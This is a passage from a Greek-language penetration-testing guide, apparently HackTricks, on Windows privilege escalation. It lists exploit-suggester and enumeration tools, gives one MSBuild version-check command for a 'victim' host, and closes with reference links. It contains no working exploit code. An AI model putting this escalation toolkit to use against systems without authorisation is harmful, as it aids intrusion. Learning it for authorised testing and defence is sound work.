[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο δημιουργημένο με βάση αυτή την ανάρτηση (δεν χρειάζεται accesschk για να δουλέψει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει κατάλληλα exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει κατάλληλα exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να μεταγλωττίσετε το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο θύμα μπορείτε να κάνετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
